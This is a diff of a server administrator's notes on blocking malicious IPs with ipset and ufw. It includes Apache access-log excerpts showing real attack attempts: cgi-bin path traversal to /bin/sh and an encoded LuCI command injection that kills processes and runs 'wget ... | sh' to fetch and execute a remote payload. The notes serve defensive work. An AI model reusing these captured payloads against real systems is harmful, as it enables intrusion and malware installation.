@@ -15,3 +15,52 @@ These two lines should be presented combined from jornalctl
 
 4) and reload it along with blacklist-xxx
 
+----
+cat access.log | grep cgi-bin | awk '{print $1}' | sort | uniq | while read ip; do echo "$ip"; sudo ipset add ufw-blocklist-ipsum "$ip"; done
+
+---
+
+144.126.142.59 - - [22/Sep/2024:05:41:24 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
+144.126.142.59 - - [22/Sep/2024:05:41:24 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
+185.224.128.83 - - [22/Sep/2024:11:18:01 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60 HTTP/1.1" 302 490 "-" "Go-http-client/1.1"
+185.224.128.83 - - [22/Sep/2024:11:18:02 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5431 "http://3.215.108.124:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60for+pid+in+%2Fproc%2F%5B0-9%5D%2A%2F%3B+do+pid%3D%24%7Bpid%25%2F%7D%3B+pid%3D%24%7Bpid%23%23%2A%2F%7D%3B+exe_path%3D%24%28ls+-l+%2Fproc%2F%24pid%2Fexe+2%3E%2Fdev%2Fnull+%7C+awk+%27%7Bprint+%24NF%7D%27%29%3B+if+%5B%5B+%24exe_path+%3D%3D+%2A%2F+%5D%5D%3B+then+kill+-9+%24pid%3B+fi%3B+done%3B%60" "Go-http-client/1.1"
+185.224.128.83 - - [22/Sep/2024:11:18:02 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60 HTTP/1.1" 302 490 "-" "Go-http-client/1.1"
+185.224.128.83 - - [22/Sep/2024:11:18:03 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5432 "http://3.215.108.124:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60wget+http%3A%2F%2F185.157.247.125%2Fe%2Ft+-O-+%7Csh%3B%60" "Go-http-client/1.1"
+31.220.78.187 - - [22/Sep/2024:17:38:07 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
+31.220.78.187 - - [22/Sep/2024:17:38:09 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
+
+---
+
+cat filename | cut -d' ' -f1 | while read ip; do ipset add ufw-blocklist-ipsum "$ip"; done
+
+also
+
+---
+
+(openai) ubuntu@ip-172-26-10-222:/var/log/apache2$ cat access.log.1 | grep cgi-bin | awk '{print $1}' | sort | uniq | wh
+ile read ip; do echo "$ip"; sudo ipset add ufw-blocklist-ipsum "$ip"; done
+144.126.142.59
+ipset v7.15: Element cannot be added to the set: it's already added
+162.221.197.210
+162.221.197.211
+162.221.197.213
+35.178.196.48
+45.148.10.242
+ipset v7.15: Element cannot be added to the set: it's already added
+68.183.78.62
+ipset v7.15: Element cannot be added to the set: it's already added
+(openai) ubuntu@ip-172-26-10-222:/var/log/apache2$
+
+-----
+(openai) ubuntu@ip-172-26-10-222:/var/log/apache2$ tail -f access.log
+185.91.69.110 - - [22/Sep/2024:20:15:59 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5467 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:16:01 +0000] "GET /download/file.ext HTTP/1.1" 302 3083 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:17:56 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5468 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:17:58 +0000] "GET /SiteLoader HTTP/1.1" 302 3083 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:20:11 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5467 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:20:12 +0000] "GET /mPlayer HTTP/1.1" 302 3083 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:22:11 +0000] "GET /xmlrpc.php HTTP/1.1" 200 5466 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+185.91.69.110 - - [22/Sep/2024:20:22:13 +0000] "POST / HTTP/1.1" 204 2689 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+34.248.192.181 - - [22/Sep/2024:20:24:10 +0000] "GET / HTTP/1.1" 200 3041 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.21 Safari/537.36 MMS/1.0.2531.0"
+198.235.24.156 - - [22/Sep/2024:20:40:22 +0000] "GET / HTTP/1.1" 200 464 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+
